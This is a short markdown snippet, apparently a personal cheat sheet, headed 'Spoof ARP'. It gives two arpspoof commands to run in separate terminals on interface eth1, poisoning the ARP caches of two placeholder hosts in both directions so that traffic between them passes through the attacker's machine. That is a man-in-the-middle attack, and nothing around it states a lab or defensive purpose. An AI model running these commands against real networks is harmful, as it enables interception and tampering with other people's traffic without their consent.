# Spoof ARP
```bash
# In Terminal 1
arpspoof -i eth1 -t <Host 1> <Host 2>
# In Terminal 2
arpspoof -i eth1 -t <Host 2> <Host1>
```